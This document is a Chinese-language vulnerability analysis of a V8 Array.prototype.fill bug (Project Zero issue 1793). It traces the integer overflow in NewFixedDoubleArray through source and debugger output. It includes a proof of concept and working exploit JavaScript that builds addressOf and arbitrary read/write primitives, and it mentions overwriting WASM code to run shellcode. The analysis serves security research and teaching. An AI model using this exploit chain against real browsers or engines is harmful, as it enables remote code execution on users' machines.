## 环境搭建

```text
git reset --hard dd68954
gclient sync
./tools/dev/gm.py x64.debug
ninja -C out.gn/x64.debug
```

## 调试：

```
r --allow-natives-syntax issue-1973.js
b v8::internal::Builtin_ArrayPrototypeFill(int, unsigned long*, v8::internal::Isolate*)
b v8::internal::Factory::NewFixedDoubleArray(int, v8::internal::PretenureFlag)
b v8::internal::Builtin_Impl_ArrayPrototypeFill(v8::internal::BuiltinArguments, v8::internal::Isolate*)
```

为了能看到源码，所以选择编译的是debug版本的d8，里面那些DCHECK的宏需要自己跳过去或者对源码打patch；

后面会跟踪调试到Builtin里的函数，Builtin的函数是不能源码调试的，我的选择是把libv8.so拖进ida，然后和源码对比着看，比如源码中的`BUILTIN(ArrayPrototypeFill)`函数，下断点只能下到开头，但是调试的时候源码是不会跟着动的，所以在ida中找到其对应的`v8::internal::Builtin_Impl_ArrayPrototypeFill`函数对着调试：

```cpp
  v54[0] = a1;
  v54[1] = a2;
  v53 = a3;
  v8::internal::HandleScope::HandleScope((v8::internal::HandleScope *)v52, a3);
  if ( (unsigned int)v8::internal::Isolate::debug_execution_mode(v53) != 32
    || (v14 = v8::internal::Isolate::debug(v53),
        v51 = v8::internal::BuiltinArguments::receiver((v8::internal::BuiltinArguments *)v54),
        (v8::internal::Debug::PerformSideEffectCheckForObject(v14, v51) & 1) != 0) )
  {
    std::__Cr::atomic<v8::internal::ItemParallelJob::Item::ProcessingState>::atomic(&v47, 0LL);
    v46 = v53;
    v13 = v53;
    v44 = v8::internal::BuiltinArguments::receiver((v8::internal::BuiltinArguments *)v54);
    v45 = v8::internal::Object::ToObject(v13, v44, 0LL);
    if ( (v8::internal::MaybeHandle<v8::internal::SeqString>::ToHandle<v8::internal::SeqString>(&v45, &v47) & 1) != 0 )
    {
      v40 = v53;
      v37 = v47;
      length = v8::internal::`anonymous namespace'::GetLengthProperty(v53, v47);
      v38[0] = v4;
      length_ = length;
      if ( (v8::Maybe<double>::To(v38, &v41) & 1) != 0 )
      {
        v34 = v8::internal::BuiltinArguments::atOrUndefined((v8::internal::BuiltinArguments *)v54, v53, 2);
        v32 = v53;
        v29 = v34;
        v5 = v8::internal::`anonymous namespace'::GetRelativeIndex(v53, v34, v41, 0.0);
        v30[0] = v6;
        v31 = v5;
        if ( (v8::Maybe<double>::To(v30, &start_index) & 1) != 0 )
  // 略
```

## 漏洞分析

### 漏洞函数：

```cpp
Handle<FixedArrayBase> Factory::NewFixedDoubleArray(int length,
                                                    PretenureFlag pretenure) {
  DCHECK_LE(0, length);									// (1)
  if (length == 0) return empty_fixed_array();
  if (length > FixedDoubleArray::kMaxLength) {			// (2)
    isolate()->heap()->FatalProcessOutOfMemory("invalid array length");
  }
  int size = FixedDoubleArray::SizeFor(length);			// (3)
  Map map = *fixed_double_array_map();
  HeapObject result =
      AllocateRawWithImmortalMap(size, pretenure, map, kDoubleAligned);
  Handle<FixedDoubleArray> array(FixedDoubleArray::cast(result), isolate());
  array->set_length(length);						
  return array;
}
```

该函数在（1）处对传入的length进行了check，但是`DCHECK`只在`debug`中起作用，在`release`版本中并不起作用；所以当传入的length为负数时，可以绕过（2）处的检查（`FixedDoubleArray::kMaxLength`的类型为int，而不是unsigned int）；接着在（3）处会用length来计算处需要分配的内存大小，如果我们合理的控制length的值，就能使得算出来的size为一个正数，以下是`FixedDoubleArray::SizeFor`的实现：

```cpp
  // Garbage collection support.
  inline static int SizeFor(int length) {
    return kHeaderSize + length * kDoubleSize;
  }
```

如果我们传入的length为0x80000000，则会返回`0x10 + 0x80000000 * 8 = 0x10`，导致后续的`AllocateRawWithImmortalMap`函数只分配了0x10大小的内存空间。

### 触发漏洞函数

`v8/src/builtins/builtins-array.cc`文件中的`ArrayPrototypeFill`函数在特定情况下会调用到漏洞函数，我们以poc中的代码来跟踪该过程：

poc.js：

```javascript
array = [];
array.length = 0xffffffff;
arr = array.fill(1.1, 0x80000000 - 1, {valueOf() {
  array.length = 0x100;
  array.fill(1.1);
  return 0x80000000;
}});
```

#### BUILTIN(ArrayPrototypeFill)

```cpp
BUILTIN(ArrayPrototypeFill) {
  HandleScope scope(isolate);

  if (isolate->debug_execution_mode() == DebugInfo::kSideEffects) {
    if (!isolate->debug()->PerformSideEffectCheckForObject(args.receiver())) {
      return ReadOnlyRoots(isolate).exception();
    }
  }

  // 1. Let O be ? ToObject(this value).
  Handle<JSReceiver> receiver;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, receiver, Object::ToObject(isolate, args.receiver()));

  // 2. Let len be ? ToLength(? Get(O, "length")).
  double length;
  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, length, GetLengthProperty(isolate, receiver));						// (4)

  // 3. Let relativeStart be ? ToInteger(start).
  // 4. If relativeStart < 0, let k be max((len + relativeStart), 0);
  //    else let k be min(relativeStart, len).
  Handle<Object> start = args.atOrUndefined(isolate, 2);

  double start_index;
  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, start_index, GetRelativeIndex(isolate, length, start, 0));			// (5)

  // 5. If end is undefined, let relativeEnd be len;
  //    else let relativeEnd be ? ToInteger(end).
  // 6. If relativeEnd < 0, let final be max((len + relativeEnd), 0);
  //    else let final be min(relativeEnd, len).
  Handle<Object> end = args.atOrUndefined(isolate, 3);

  double end_index;
  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, end_index, GetRelativeIndex(isolate, length, end, length));			// (6)

  if (start_index >= end_index) return *receiver;

  // Ensure indexes are within array bounds
  DCHECK_LE(0, start_index);
  DCHECK_LE(start_index, end_index);
  DCHECK_LE(end_index, length);

  Handle<Object> value = args.atOrUndefined(isolate, 1);

  if (TryFastArrayFill(isolate, &args, receiver, value, start_index,
                       end_index)) {
    return *receiver;
  }
  return GenericArrayFill(isolate, receiver, value, start_index, end_index);
}
```

函数在（4）处获得最初数组的长度，在（5）和（6）处调用`GetRelativeIndex`函数取得start_index和end_index，而`GetRelativeIndex`函数可以触发用户自定义的JS函数：

#### GetRelativeIndex

```cpp
V8_WARN_UNUSED_RESULT Maybe<double> GetRelativeIndex(Isolate* isolate,
                                                     double length,
                                                     Handle<Object> index,
                                                     double init_if_undefined) {
  double relative_index = init_if_undefined;
  if (!index->IsUndefined()) {
    Handle<Object> relative_index_obj;										// 用户自定义的对象
    ASSIGN_RETURN_ON_EXCEPTION_VALUE(isolate, relative_index_obj,			// （7）
                                     Object::ToInteger(isolate, index),
                                     Nothing<double>());
    relative_index = relative_index_obj->Number();
  }

  if (relative_index < 0) {
    return Just(std::max(length + relative_index, 0.0));
  }

  return Just(std::min(relative_index, length));							// (8)
}
```

`GetRelativeIndex`在（7）处会触发用户自定义的JS函数，比如valueOf函数，该自定义函数可能会把数组的length改变，而第（8）处的判断用的还是原来传入进来的length，导致返回值计算不正确；

#### TryFastArrayFill

在取得了start_index和end_index后，`BUILTIN(ArrayPrototypeFill)`会调用`TryFastArrayFill(isolate, &args, receiver, value, start_index,end_index)`，其中receiver就是我们的数组对象：

```cpp
In file: /home/ruan/v8_build/v8_src/v8/src/builtins/builtins-array.cc
   203   return *receiver;
   204 }
   205 
   206 V8_WARN_UNUSED_RESULT bool TryFastArrayFill(
   207     Isolate* isolate, BuiltinArguments* args, Handle<JSReceiver> receiver,
 ► 208     Handle<Object> value, double start_index, double end_index) {
   209   // If indices are too large, use generic path since they are stored as
   210   // properties, not in the element backing store.
   211   if (end_index > kMaxUInt32) return false;
   212   if (!receiver->IsJSObject()) return false;
   213 
       
pwndbg> job *receiver
0x195ae230dba1: [JSArray]
 - map: 0x28e44408a9a9 <Map(HOLEY_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1bdfe9690ff1 <JSArray[0]>
 - elements: 0x195ae230e959 <FixedDoubleArray[256]> [HOLEY_DOUBLE_ELEMENTS]
 - length: 256
 - properties: 0x16d851400c21 <FixedArray[0]> {
    #length: 0x27e724f001a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x195ae230e959 <FixedDoubleArray[256]> {
       0-255: 1.1
 }
```

可以看到该数组对象的length已经被改成了256，但是此时的start_index和end_index参数还是因为计算错误而传进来的值：

```cpp
pwndbg> p/x $ymm0
$8 = {
  v8_float = {0xffffffff, 0x1b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  v4_double = {0x7fffffff, 0x0, 0x0, 0x0},							// start_index
  v32_int8 = {0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0 <repeats 24 times>},
  v16_int16 = {0x0, 0xffc0, 0xffff, 0x41df, 0x0 <repeats 12 times>},
  v8_int32 = {0xffc00000, 0x41dfffff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  v4_int64 = {0x41dfffffffc00000, 0x0, 0x0, 0x0},
  v2_int128 = {0x41dfffffffc00000, 0x0}
}
pwndbg> p/x $ymm1
$9 = {
  v8_float = {0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  v4_double = {0x80000000, 0x0, 0x0, 0x0},							// end_index
  v32_int8 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x41, 0x0 <repeats 24 times>},
  v16_int16 = {0x0, 0x0, 0x0, 0x41e0, 0x0 <repeats 12 times>},
  v8_int32 = {0x0, 0x41e00000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  v4_int64 = {0x41e0000000000000, 0x0, 0x0, 0x0},
  v2_int128 = {0x41e0000000000000, 0x0}
}
```

接着`TryFastArrayFill`在经过一系列检查后，调用具体的Fill函数来进行填充：

```cpp
V8_WARN_UNUSED_RESULT bool TryFastArrayFill(
    Isolate* isolate, BuiltinArguments* args, Handle<JSReceiver> receiver,
    Handle<Object> value, double start_index, double end_index) {
  // If indices are too large, use generic path since they are stored as
  // properties, not in the element backing store.
  if (end_index > kMaxUInt32) return false;
  if (!receiver->IsJSObject()) return false;

  if (!EnsureJSArrayWithWritableFastElements(isolate, receiver, args, 1, 1)) {
    return false;
  }

  Handle<JSArray> array = Handle<JSArray>::cast(receiver);

  // If no argument was provided, we fill the array with 'undefined'.
  // EnsureJSArrayWith... does not handle that case so we do it here.
  // TODO(szuend): Pass target elements kind to EnsureJSArrayWith... when
  //               it gets refactored.
  if (args->length() == 1 && array->GetElementsKind() != PACKED_ELEMENTS) {
    // Use a short-lived HandleScope to avoid creating several copies of the
    // elements handle which would cause issues when left-trimming later-on.
    HandleScope scope(isolate);
    JSObject::TransitionElementsKind(array, PACKED_ELEMENTS);
  }

  DCHECK_LE(start_index, kMaxUInt32);
  DCHECK_LE(end_index, kMaxUInt32);

  uint32_t start, end;
  CHECK(DoubleToUint32IfEqualToSelf(start_index, &start));
  CHECK(DoubleToUint32IfEqualToSelf(end_index, &end));

  ElementsAccessor* accessor = array->GetElementsAccessor();
  accessor->Fill(array, value, start, end);							// 调用具体的Fill函数来进行填充
  return true;
}
```

调用Fill前的参数：

```cpp
In file: /home/ruan/v8_build/v8_src/v8/src/builtins/builtins-array.cc
   234   uint32_t start, end;
   235   CHECK(DoubleToUint32IfEqualToSelf(start_index, &start));
   236   CHECK(DoubleToUint32IfEqualToSelf(end_index, &end));
   237 
   238   ElementsAccessor* accessor = array->GetElementsAccessor();
 ► 239   accessor->Fill(array, value, start, end);
   240   return true;
   241 }
   242 }  // namespace
   243 
   244 BUILTIN(ArrayPrototypeFill) {

pwndbg> p/x start
$11 = 0x7fffffff
pwndbg> p/x end
$12 = 0x80000000
```

接着进入到：

#### static Object FillImpl

```cpp
static Object FillImpl(Handle<JSObject> receiver, Handle<Object> obj_value,
                         uint32_t start, uint32_t end) {
    // Ensure indexes are within array bounds
    DCHECK_LE(0, start);
    DCHECK_LE(start, end);

    // Make sure COW arrays are copied.
    if (IsSmiOrObjectElementsKind(Subclass::kind())) {
      JSObject::EnsureWritableFastElements(receiver);
    }

    // Make sure we have enough space.
    uint32_t capacity =
        Subclass::GetCapacityImpl(*receiver, receiver->elements());			// (9)
    if (end > capacity) {
      Subclass::GrowCapacityAndConvertImpl(receiver, end);					// (10)
      CHECK_EQ(Subclass::kind(), receiver->GetElementsKind());
    }
    DCHECK_LE(end, Subclass::GetCapacityImpl(*receiver, receiver->elements()));

    for (uint32_t index = start; index < end; ++index) {
      Subclass::SetImpl(receiver, index, *obj_value);
    }
    return *receiver;
  }
```

该函数在（9）处取得原来数组elements的长度，在例子中是0x100，由于end和capacity是无符号的比较，所以会进入到（10）处，`Subclass::GrowCapacityAndConvertImpl(receiver, end);`经过多层warpper函数，最终会走到：

#### ConvertElementsWithCapacity

```cpp
// /home/ruan/v8_build/v8_src/v8/src/elements.cc 
static Handle<FixedArrayBase> ConvertElementsWithCapacity(
      Handle<JSObject> object, Handle<FixedArrayBase> old_elements,
      ElementsKind from_kind, uint32_t capacity, uint32_t src_index,
      uint32_t dst_index, int copy_size) {
    Isolate* isolate = object->GetIsolate();
    Handle<FixedArrayBase> new_elements;
    if (IsDoubleElementsKind(kind())) {
      new_elements = isolate->factory()->NewFixedDoubleArray(capacity);					// (11)
    } else {
      new_elements = isolate->factory()->NewUninitializedFixedArray(capacity);
    }

    int packed_size = kPackedSizeNotKnown;
    if (IsFastPackedElementsKind(from_kind) && object->IsJSArray()) {
      packed_size = Smi::ToInt(JSArray::cast(*object)->length());
    }

    Subclass::CopyElementsImpl(isolate, *old_elements, src_index, *new_elements,
                               from_kind, dst_index, packed_size, copy_size);

    return new_elements;
  }
```

在（11）处调用漏洞函数，且参数capacity就是我们传入的0x80000000，这里给出栈回溯：

![](/img/issue1793-stacktrace.png)

后续在`void BasicGrowCapacityAndConvertImpl(Handle<JSObject> object, Handle<FixedArrayBase> old_elements,ElementsKind from_kind, ElementsKind to_kind, uint32_t capacity)`函数中的：

```cpp
static void BasicGrowCapacityAndConvertImpl(
      Handle<JSObject> object, Handle<FixedArrayBase> old_elements,
      ElementsKind from_kind, ElementsKind to_kind, uint32_t capacity) {
    Handle<FixedArrayBase> elements =
        ConvertElementsWithCapacity(object, old_elements, from_kind, capacity);

    if (IsHoleyElementsKind(from_kind)) {
      to_kind = GetHoleyElementsKind(to_kind);
    }
    Handle<Map> new_map = JSObject::GetElementsTransitionMap(object, to_kind);
    JSObject::SetMapAndElements(object, new_map, elements);				// （12）

    // Transition through the allocation site as well if present.
    JSObject::UpdateAllocationSite(object, to_kind);

    if (FLAG_trace_elements_transitions) {
      JSObject::PrintElementsTransition(stdout, object, from_kind, old_elements,
                                        to_kind, elements);
    }
  }
```

（12）处会将刚刚分配的array（elements参数）赋值给Array对象：

```cpp
in file: /home/ruan/v8_build/v8_src/v8/src/elements.cc
   928 
   929     if (IsHoleyElementsKind(from_kind)) {
   930       to_kind = GetHoleyElementsKind(to_kind);
   931     }
   932     Handle<Map> new_map = JSObject::GetElementsTransitionMap(object, to_kind);
 ► 933     JSObject::SetMapAndElements(object, new_map, elements);
   934 
   935     // Transition through the allocation site as well if present.
   936     JSObject::UpdateAllocationSite(object, to_kind);
   937 
   938     if (FLAG_trace_elements_transitions) {
pwndbg> job *object
0x3d5f8a78dba1: [JSArray]
 - map: 0x3acebb00a9a9 <Map(HOLEY_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3333f7c10ff1 <JSArray[0]>
 - elements: 0x3d5f8a78e959 <FixedDoubleArray[256]> [HOLEY_DOUBLE_ELEMENTS]
 - length: 256
 - properties: 0x29ee7b000c21 <FixedArray[0]> {
    #length: 0x16e48e4801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x3d5f8a78e959 <FixedDoubleArray[256]> {
       0-255: 1.1
 }
pwndbg> telescope *(long*)elements-1							// 漏洞函数申请的elements
00:0000│  0x149a3a30f1a8 —▸ 0x220392981459 ◂— 0x2203929801		
01:0008│  0x149a3a30f1b0 ◂— 0x8000000000000000					// 长度为0x80000000
02:0010│  0x149a3a30f1b8 ◂— 0x3ff199999999999a
... ↓     5 skipped
```

执行完`JSObject::SetMapAndElements(object, new_map, elements);`后：

```cpp
In file: /home/ruan/v8_build/v8_src/v8/src/elements.cc
   931     }
   932     Handle<Map> new_map = JSObject::GetElementsTransitionMap(object, to_kind);
   933     JSObject::SetMapAndElements(object, new_map, elements);
   934 
   935     // Transition through the allocation site as well if present.
 ► 936     JSObject::UpdateAllocationSite(object, to_kind);
   937 
   938     if (FLAG_trace_elements_transitions) {
   939       JSObject::PrintElementsTransition(stdout, object, from_kind, old_elements,
   940                                         to_kind, elements);
   941     }
pwndbg> job *object
0x149a3a30dba1: [JSArray]
 - map: 0x159f9478a9a9 <Map(HOLEY_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1e95f1b90ff1 <JSArray[0]>
 - elements: 0x149a3a30f1a9 <FixedDoubleArray[-2147483648]> [HOLEY_DOUBLE_ELEMENTS]			// 该elements只有0x10的大小
 - length: 256																				// 而Array对象的length为256，造成越界
 - properties: 0x220392980c21 <FixedArray[0]> {
    #length: 0x07df194001a9 <AccessorInfo> (const accessor descriptor)
 }
pwndbg> 
```

## 漏洞利用

在触发漏洞后继续申请一些对象，利用数组的越界读写来构造处任意地址读写；

poc：

```javascript
// test on d8 release version
array = [];
array.length = 0xffffffff;
arr = array.fill(1.1, 0x80000000 - 1, {valueOf() {
  array.length = 0x100;
  array.fill(1.1);
  return 0x80000000;
}});
let a = new Array(0x12345678,0); 
let ab = new ArrayBuffer(8); 
%DebugPrint(array);
%DebugPrint(a);
%DebugPrint(ab);
%SystemBreak();
```

在gdb中：

```cpp
pwndbg> r --allow-natives-syntax issue-1973.js
Starting program: /home/ruan/v8_build/v8_src/v8/out.gn/x64.release/d8 --allow-natives-syntax issue-1973.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7fd5ce4ca700 (LWP 37063)]
[New Thread 0x7fd5cdcc9700 (LWP 37064)]
[New Thread 0x7fd5cd4c8700 (LWP 37065)]
[New Thread 0x7fd5cccc7700 (LWP 37066)]
[New Thread 0x7fd5cc4c6700 (LWP 37067)]
[New Thread 0x7fd5cbcc5700 (LWP 37068)]
[New Thread 0x7fd5cb4c4700 (LWP 37069)]
0x0d77a9f8db99 <JSArray[256]>
0x0d77a9f8f1b1 <JSArray[2]>
0x0d77a9f8f201 <ArrayBuffer map = 0x2bb1925021b9>
// 查看array：
pwndbg> telescope 0x0d77a9f8db98
00:0000│  0xd77a9f8db98 —▸ 0x2bb19250a9a9 ◂— 0x40000360b2f5001
01:0008│  0xd77a9f8dba0 —▸ 0x360b2f500c21 ◂— 0x360b2f5007
02:0010│  0xd77a9f8dba8 —▸ 0xd77a9f8f1a1 ◂— 0x9a0000360b2f5014				// array->elements
pwndbg> telescope 0xd77a9f8f1a0 30
00:0000│  0xd77a9f8f1a0 —▸ 0x360b2f501459 ◂— 0x360b2f5001
01:0008│  0xd77a9f8f1a8 ◂— 0x3ff199999999999a								// 这里是因为触发漏洞后写了一个该值在这里
02:0010│  0xd77a9f8f1b0 —▸ 0x2bb192502d99 ◂— 0x40000360b2f5001				// 这个是变量a的地址
03:0018│  0xd77a9f8f1b8 —▸ 0x360b2f500c21 ◂— 0x360b2f5007
04:0020│  0xd77a9f8f1c0 —▸ 0xd77a9f8f1e1 ◂— 0x360b2f5007					// a->elements
05:0028│  0xd77a9f8f1c8 ◂— 0x200000000
06:0030│  0xd77a9f8f1d0 —▸ 0x360b2f505249 ◂— 0x20000360b2f5001
07:0038│  0xd77a9f8f1d8 —▸ 0x2ff5f20213b9 ◂— 0x360b2f505a /* 'ZP/\x0b6' */
08:0040│  0xd77a9f8f1e0 —▸ 0x360b2f5007b1 ◂— 0x360b2f5001
09:0048│  0xd77a9f8f1e8 ◂— 0x200000000
0a:0050│  0xd77a9f8f1f0 ◂— 0x1234567800000000								// a->elements具体存放的值，0x12345678和下面的0
0b:0058│  0xd77a9f8f1f8 ◂— 0x0
0c:0060│  0xd77a9f8f200 —▸ 0x2bb1925021b9 ◂— 0x80000360b2f5001
0d:0068│  0xd77a9f8f208 —▸ 0x360b2f500c21 ◂— 0x360b2f5007
0e:0070│  0xd77a9f8f210 —▸ 0x360b2f500c21 ◂— 0x360b2f5007					// 变量ab (ArrayBuffer)的地址
0f:0078│  0xd77a9f8f218 ◂— 0x8
10:0080│  0xd77a9f8f220 —▸ 0x55a250fee7b0 ◂— 0x0							// ab->backstore_ptr
11:0088│  0xd77a9f8f228 ◂— 0x2
12:0090│  0xd77a9f8f230 ◂— 0x0
13:0098│  0xd77a9f8f238 ◂— 0x0
14:00a0│  0xd77a9f8f240 ◂— 0x3ff199999999999a

```

我们可以直接利用array来对变量a和ab进行修改以达到任意地址读写的效果：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Int32Array(buf);
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

array = [];
array.length = 0xffffffff;
arr = array.fill(1.1, 0x80000000 - 1, {valueOf() {
  array.length = 0x100;
  array.fill(1.1);
  return 0x80000000;

}});
let a = new Array(0x12345678,0); 
let ab = new ArrayBuffer(8);

let idx = arr.indexOf(i2f(0x1234567800000000n)); 
function addressOf(obj)
{
    a[0] = obj;         
    return f2i(arr[idx]);
}
let backstore_ptr_idx = arr.indexOf(i2f(8n)) + 1; 
function arb_read(addr)
{
    arr[backstore_ptr_idx] = i2f(addr);
    let dv = new DataView(ab); 
    return f2i(dv.getFloat64(0,true)) 
}
function arb_write(addr,data)
{
    arr[backstore_ptr_idx] = i2f(addr);
    let ua = new Uint8Array(ab); 
    ua.set(data);
}
```

有了任意地址读写，最后只需要覆盖WASM的code就能执行shellcode了

## 参考链接

https://bugs.chromium.org/p/project-zero/issues/detail?id=1793

https://zhuanlan.zhihu.com/p/352344133

